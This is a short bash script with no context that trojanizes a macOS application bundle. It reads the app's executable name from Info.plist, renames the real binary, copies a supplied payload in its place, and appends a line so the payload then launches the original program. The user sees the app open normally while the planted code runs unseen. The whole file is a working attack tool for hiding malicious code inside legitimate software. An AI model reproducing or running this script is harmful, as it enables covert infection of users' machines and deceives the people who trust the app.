#!/usr/bin/env bash

payload=$1
app_root=$2
info=$app_root/Contents/Info.plist
macos=$app_root/Contents/MacOS
binary=$macos/$(/usr/libexec/PlistBuddy $info -c "Print :CFBundleExecutable")

mv $binary ${binary}_
cp $payload $binary
chmod +x $binary

echo '$(cd $(dirname ${BASH_SOURCE[0]}) && pwd)/$(basename $0)_' >> $binary
